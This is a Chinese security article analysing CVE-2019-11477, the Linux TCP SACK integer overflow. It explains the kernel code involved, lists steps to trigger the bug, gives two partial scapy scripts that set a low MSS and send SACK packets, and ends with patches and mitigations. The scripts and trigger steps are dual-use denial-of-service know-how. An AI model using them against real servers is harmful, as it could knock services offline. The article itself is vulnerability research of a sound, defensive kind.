# CVE-2019-11477：Linux 内核中TCP协议栈整数溢出漏洞详细分析

阅读量 **376147**

|评论 **7**

发布时间 : 2019-06-21 11:51:41

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

罗权、于长奇@奇安信代码卫士

## 漏洞概述

2019年6月18日，RedHat官网发布CVE编号为CVE-2019-11477的漏洞，此漏洞是一个底层协议栈的整数溢出漏洞，影响Linux
内核2.6.29及以上版本，理论上可以造成远程拒绝服务漏洞。经过我们团队分析验证，在实际环境中很难触发此漏洞，所以在实际环境中此漏洞危害没那么大。

## 漏洞原理

该漏洞是一个位于skb_buff结构体上tcp_gso_segs成员的整数溢出漏洞。linux
kernel数据包文以skb_buff结构体表示，内核为提升发包效率提供了NETIF_F_SG（默认开启）、NETIF_F_UFO等功能，当发送报文时，将会将小报文以类似分片形式累积，累积为大报文统一发送，由网卡硬件进行分片。此时报文累积最大长度为32k（x86）或者64k(powerpc)。代码中，小报文积累队列成员为skb_buff结构体的tcp_skb_cb对象，其中tcp_gso_segs成员是个short
unsight int 类型成员，代表小报文个数。

    
    
    \linux\net\ipv4\tcp.c    
    
    if (can_coalesce) {
    
                                skb_frag_size_add(&skb_shinfo(skb)->frags[i - 1], copy);
    
                       } else {
    
                                get_page(page);
    
                                skb_fill_page_desc(skb, i, page, offset, copy);
    
                       }
    
    
    
    linux/include/linux/skbuff.h
    struct tcp_skb_cb {
    __u32 seq; /* Starting sequence number */
    __u32 end_seq; /* SEQ + FIN + SYN + datalen */
    __u32 tcp_tw_isn;
    struct {
    u16 tcp_gso_segs;
    u16 tcp_gso_size; 
    };
    __u8 tcp_flags; /2* TCP header flags. (tcp[13]) */
    …
    }

通常，TCP协议为避免分片带来的性能损失，提供了mss协商机制，通过在握手过程中提供双方mtu值，协商双方报文的最大报文长度，发送提供各自的mss长度，双方选取最小的mss值为最大报文长度，此后，双方报文的最大长度将不会超过协商得出的mss值。如果要漏洞出发，发送方在握手时将mss值强制置为8（mss协商最小值为48-最大tcp报头长度=8）。即接收方在和握手方握手时，将mss值设置为8即可。

TCP-MSS，全称TCP maximum segment
size。翻译过来是TCP最大报文尺寸。它的值代表TCP传输层期望对端发送给自己单个TCP报文的最大尺寸。

TCP协议中，当TCP协议两端在初始协商进行TCP三次握手协议的时候，主机两端会把自己当前所在链路的MSS值告知对方。当一端主机收到另外一端的MSS值候，它会评估其MSS值并与自己的MSS值做对比，取最小的值来决定TCP发送的最大报文尺寸。

如何计算本地MSS值？本地MSS=MTU-20字节的标准IP头-20字节的标准TCP头（换个角度看其实就是TCP负载）

另外一个相关的是linux的sack机制。在RFC的描述中，当TCP报文乱序到达时，TCP接收端会要求发送端连未能按照顺序发送的报文也重新发送，为改进TCP协议的发包效率，TCP提供了sack机制（自linux
kernel
2.6.29以后提供了sack机制的实现），当接收方向发送方要求重传时，重传报文将会进入tcp_sendmsg函数的tcp_gso_segs机制中，以分片的形式积累报文碎片，在skb_buff结构体中最多接受17个分片队列，在恶意会话的接收过程中，接收方可以不断地要求发送方重传，即接受方不断向发送方发送sack报文，发送方接收到sack报文后，将重新发送报文。

    
    
    linux/include/linux/skbuff.h
    define MAX_SKB_FRAGS (65536/PAGE_SIZE + 1) => 17

此时一个skb_buff结构体最多可以由17*32*1024%8=69632个报文碎片积累而成，而69632超过了tcp_gso_segs成员（无符号短整型）的最大值65535，将导致整数溢出，最终在tcp_shifted_skb函数中触发崩溃.

linux\net\ipv4\tcp_input.c

    
    
    static bool tcp_shifted_skb (struct sock *sk, …, unsigned int pcount, ...)
    
    {
    
    ...
    
    tcp_skb_pcount_add(prev, pcount);
    
    BUG_ON(tcp_skb_pcount(skb) < pcount); <= SACK panic
    
    tcp_skb_pcount_add(skb, -pcount);
    
    …
    
    }

漏洞触发步骤：

1，客户端连接服务端（同时三次握手过程中强制设置接受mss最大值为8）

2，客户端诱导服务端发送超长报文给客户端，贴近最大允许长度32k

3，客户端不断发送重传要求，服务端重复发送17次报文填满skb分片队列，导致tcp_gso_segs变量整数溢出，导致服务器远程拒绝服务。

## 漏洞验证

要成功构造poc报文，实际需要做到以下三点：

第一：诱骗服务端发送一次性发送接近32k大小TCP报文。通过服务器下载文件时（linux内核调用tcp_sendpage不走tcp_sendmsg调用可以逼近报文极限值，需要超过31k大小，实际情况是比较罕见的），发现http服务器将客户端get的数据合并，逼近32k大小数据下发到客户端，这一步是可以做到的，在TCP层，tcp_sendpage函数大概率可以做到一次下发超过31k大小的报文。

    
    
    while (size > 0) {
                                   struct sk_buff *skb = tcp_write_queue_tail(sk);
                                   int copy, i;
                                   bool can_coalesce;
     
                                   if (!tcp_send_head(sk) || (copy = size_goal - skb->len) <= 0 ||
                                       !tcp_skb_can_collapse_to(skb)) {
    new_segment:
                                                  if (!sk_stream_memory_free(sk))
                                                                 goto wait_for_sndbuf;
     
                                                  skb = sk_stream_alloc_skb(sk, 0, sk->sk_allocation,
                                                                                                  skb_queue_empty(&sk->sk_write_queue));
                                                  if (!skb)
                                                                 goto wait_for_memory;
     
                                                  skb_entail(sk, skb);
                                                  copy = size_goal;
                                   }
     
                                   if (copy > size)
                                                  copy = size;
     
                                   i = skb_shinfo(skb)->nr_frags;
                                   can_coalesce = skb_can_coalesce(skb, i, page, offset);
                                   if (!can_coalesce && i >= sysctl_max_skb_frags) {
                                                  tcp_mark_push(tp, skb);
                                                  goto new_segment;
                                   }
                                   if (!sk_wmem_schedule(sk, copy))
                                                  goto wait_for_memory;
     
                                   if (can_coalesce) {
                                                  skb_frag_size_add(&skb_shinfo(skb)->frags[i - 1], copy);
                                   } else {
                                                  get_page(page);
                                                  skb_fill_page_desc(skb, i, page, offset, copy);
                                   }

第二，将TCP报文的实际荷载设置8字节（mss设置为最小值48，TCP选项头设置为40字节，48-40=8）。此步实际情况是不默认，正常情况下是无法协商成功，客户端发起的mss协商，默认情况下服务端将不会认可，默认发行版linux系统都开启TSO（TCP
Segment
Offload）技术，为了尽可能发挥网卡性能，网卡会不断尝试扩大mss的值，当我们将mss协商成功为48时，很快TSO会将mss恢复为1460.所以实际攻击链条在此时已经被打断。

![](https://p1.ssl.qhimg.com/t011b851c8c7c0fdf2a.png)

而且在我们测试将服务端发给我们的TCP数据包的TCP选项头设为40，通过要求服务端数据包附带时间戳选项，可以使TCP选项头拥有12字节选项长度，如果需要更长的选项头，需要一些特殊的TCP选项，如md5选项，但TCP的md5选项需要重新编译内核，发行版不带md5选项

在默认情况下我们只做到了通过客户端设置服务端报文12字节长度的TCP选项头长度设置

  * 对服务端发送sack报文，指定特定报文重传。我们在对服务端进行指定字节序列的报文重传时发现，我们无法做到累加重传报文，在漏洞分析中，我们提到，我们需要使重传报文累计到超过65535导致整数溢出，但是实际测试过程中发现，TCP的重传实在过于迅速，我们的发包速度根本不够服务端的gso机制生效累计积累超过65535个报文，我的最大累计此时30余次，服务端收到sack后累积重传报文，收到ack后或其余机制释放累积。请注意下图的报文序号，第27个报文请求指定重传，第28个报文重传指定报文，29个报文立刻发送正确顺序的报文，第27个报文和第29个报文直接的时间实在过于短暂，可以通过并发分布式攻击可以做到重传报文累计超过65535次。

其他尝试：

由于此漏洞的主要瑕疵在于mss协商机制启用非默认，我们曾经尝试绕过linux
kernel的mss协商机制对服务端发起进攻，尝试使用sack报文告诉服务端我们只缺少8字节长度（报文原长48字节情况下），此时服务端回复的报文并没有只给我们8个字节长度的报文，而是把所缺少的报文所属的报文（48字节长度）发回给我们，绕过尝试失败。

最终我们认定此漏洞实际危害不大。

测试代码：

我们使用的是python的scapy库进行伪造客户端与服务端进行通信

Sack部分测试代码：

    
    
    from scapy.all import *
    
    import time
    
    i=IP()
    
    i.dst="192.168.124.144"
    
    t=TCP()
    
    t.dport=8887
    
    t.flags="S"
    
    t.options=[('MSS',18),('SAckOK', '')]
    
    
    
    #sr1(i/t)
    
    SYNACK=sr1(i/t)
    
    seq_num=int(SYNACK.seq)
    
    
    
    # ACK
    
    ACK=TCP( dport=8887, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
    
    send(i/ACK)
    
    print seq_num
    
    #SACK=TCP(dport=8887,flags='A',seq=SYNACK.ack, ack=SYNACK.seq + 1)
    
    time.sleep(1)
    
    SACK=TCP(dport=8887,flags='A',seq=SYNACK.ack , ack=SYNACK.seq + 1+0x30*2)
    
    #print SACK.seq
    
    num=3
    
    SACK.options=[('SAck',(SYNACK.seq+1+0x30*3 ,SYNACK.seq+1+0x30*4 ))]
    
    send(i/SACK)
    
    #while num<=100:
    
    #    SACK.options=[('SAck',(seq+1+0x30+0x30*num ,seq+1+0x30  +0x30*(num+1)))]
    
    #    send(i/SACK)
    
    #    num=num+1
    
    #    if num==99:
    
    #        num=3
    
    time.sleep( 500 )

Mss部分测试代码：

    
    
    from scapy.all import *
    
    import time
    
    
    
    
    
    i=IP()
    
    i.dst="192.168.216.145"
    
    t=TCP()
    
    t.sport=3333
    
    t.dport=8887
    
    t.flags="S"
    
    t.options=[('MSS',48),('SAckOK', ''),('Timestamp',(111,222))]
    
    
    
    #sr1(i/t)
    
    SYNACK=sr1(i/t)
    
    seq=int(SYNACK.seq)
    
    # ACK
    
    ACK=TCP(sport=3333, dport=8887, flags='A', seq=SYNACK.ack, ack=SYNACK.seq + 1)
    
    ACK.options=[('Timestamp',(222,333))]
    
    send(i/ACK)
    
    print ACK.seq
    
    #SACK=TCP(dport=8887,flags='A',seq=SYNACK.ack, ack=SYNACK.seq + 1)
    
    print str(SYNACK.ack)
    
    SACK=TCP(dport=8887,flags='A',seq=SYNACK.ack, ack=SYNACK.seq+1+0x30)
    
    print SACK.seq
    
    SACK.options=[('SAck',(seq+1+0x38 ,seq+1+0x38  +0x30))]
    
    #while True:
    
    time.sleep( 1 )
    
    send(i/SACK)
    
    time.sleep( 500 )

## 漏洞修复

（1）及时更新补丁

https://github.com/Netflix/security-bulletins/blob/master/advisories/third-party/2019-001/PATCH_net_1_4.patch

Linux内核版本>=4.14需要打第二个补丁

https://github.com/Netflix/security-bulletins/blob/master/advisories/third-party/2019-001/PATCH_net_1a.patch

（2）禁用SACK处理

echo 0 > /proc/sys/net/ipv4/tcp_sack

（3）使用过滤器来阻止攻击

https://github.com/Netflix/security-bulletins/blob/master/advisories/third-party/2019-001/block-low-mss/README.md

此缓解需要禁用TCP探测时有效（即在/etc/sysctl.conf文件中将net.ipv4.tcp_mtu_probingsysctl设置为0）

（4）RedHat用户可以使用以下脚本来检查系统是否存在漏洞

https://access.redhat.com/sites/default/files/cve-2019-11477–2019-06-17-1629.sh

**关于奇安信代码卫士**

“奇安信代码卫士”
是奇安信集团旗下专注于软件源代码安全的产品线，能力涵盖了源代码缺陷检测、源代码合规检测、源代码溯源检测三大方向，分别解决软件开发过程中的安全缺陷和漏洞问题、代码编写的合规性问题、开源代码安全管控问题。“代码卫士”系列产品可支持
Windows、Linux、Android、Apple iOS、IBM AIX 等平台上的源代码安全分析，支持的编程语言涵盖
C、C++、C#、Objective-C、Java、JSP、JavaScript、PHP、Python、Go、区块链智能合约 Solidity
等。目前代码卫士已应用于上百家大型机构，帮助用户构建自身的代码安全保障体系，消减软件代码安全隐患。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **奇安信代码卫士** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/180765](/post/id/180765)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [linux](/tag/linux)
  * [CVE-2019-11477](/tag/CVE-2019-11477)

 **+1** __10赞

 __收藏

![](https://p4.ssl.qhimg.com/t015a32ce3696fa7636.png) 奇安信代码卫士

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

